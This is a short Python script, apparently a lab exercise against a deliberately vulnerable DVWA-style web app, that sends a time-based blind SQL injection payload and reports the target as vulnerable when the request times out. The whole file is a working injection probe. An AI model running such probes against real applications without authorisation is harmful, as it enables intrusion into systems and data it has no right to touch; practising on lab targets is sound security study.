import requests
import urllib.parse

inject = "1' and sleep(2) #"

URL="http://10.0.2.13:8080/vulnerabilities/sqli_blind/?id="+urllib.parse.quote(inject)+"&Submit=Submit#"

cookie={
    "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
    "security":"low"
    }

session1=requests.Session()
        
try:
    res=session1.get(URL,cookies=cookie,timeout=1)
except(requests.exceptions.ReadTimeout):
    print("It's Vulnerable:"+inject)
